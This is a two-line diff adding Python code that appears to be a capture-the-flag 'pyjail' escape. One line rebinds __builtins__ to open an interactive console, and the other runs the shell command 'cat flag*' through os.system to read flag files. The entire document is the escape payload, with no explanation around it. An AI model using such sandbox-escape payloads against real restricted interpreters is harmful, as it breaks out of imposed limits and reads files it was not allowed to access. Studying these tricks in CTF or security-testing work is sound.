@@ -1,0 +1,2 @@
+(__builtins__:=__import__('code'))==(lambda:interact())()
+__import__("os").system("cat flag*")
